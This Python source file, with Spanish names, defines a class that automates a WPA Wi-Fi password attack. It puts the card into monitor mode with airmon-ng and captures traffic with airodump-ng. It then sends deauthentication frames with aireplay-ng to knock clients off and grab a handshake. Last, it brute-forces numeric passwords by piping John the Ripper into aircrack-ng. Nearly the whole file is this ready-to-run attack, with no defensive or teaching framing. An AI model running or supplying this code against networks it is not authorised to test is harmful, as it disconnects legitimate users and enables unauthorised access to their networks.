import os, sys
import subprocess
import time
import pandas as pd
import commands
import signal


class Wpa():
	"""docstring fos Wep"""
	def __init__(self,red):
		self._red = red

	def red(self):
		return self._red
	
	def atacar(self):
		wlan = commands.getoutput('sudo airmon-ng check kill')
		comando = 'sudo airmon-ng start wlan0 '+self.red().channel()
		wlan = commands.getoutput(comando)
		nom = self.red().bssid()
		nom = nom.replace(" ","_")
		archivo = './datos/'+nom+'/'+nom
		print('Empezando la busqueda de handshakes')
		comando ='sudo airodump-ng --bssid '+str(self.red().essid())+' --channel '+str(self.red().channel())+' --write '+archivo+' wlan0mon'
		airodump = subprocess.Popen(comando,shell=True,preexec_fn=os.setsid)
		time.sleep(2)
		print('lanzando la desautenticacion')
		comando = 'sudo aireplay-ng -0 15 -a '+self.red().essid()+' wlan0mon'
		aireplay = subprocess.Popen([comando],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True,preexec_fn=os.setsid)
		aireplay.wait()
		print('Capturando handshake')
		time.sleep(120)
		airodump.terminate()
		airodump.kill()
		os.killpg(os.getpgid(airodump.pid),signal.SIGTERM)
		comando = 'sudo john --incremental:Digits --stdout | aircrack-ng -b '+self.red().essid()+' '+archivo+'-01.cap'+' -w - > '+archivo+'contrasena'
		print(comando)
		print('Descifrando la contrasena')
		result = subprocess.Popen(comando,shell=True,preexec_fn=os.setsid)
		time.sleep(60)
		result.terminate()
		result.kill()
		os.killpg(os.getpgid(result.pid),signal.SIGTERM)
		comando = 'cat '+archivo+'contrasena |grep "KEY FOUND"'
		salida = commands.getoutput(comando)
		salida = str(salida)
		print(salida)
		if salida != '':
			self.red().set_contrasena(salida)
		else:
			print('Caduco el tiempo del ataque, la contrasena no pudo ser descifrada')
			self.red().set_contrasena('El tiempo del ataque ha caducado y no se pudo recuperar la contrasena')	
		self.habilitarWlan()


	def habilitarWlan(self):
		wlan = commands.getoutput('sudo airmon-ng stop wlan0mon')
		wlan = commands.getoutput('sudo ifconfig wlan0 up')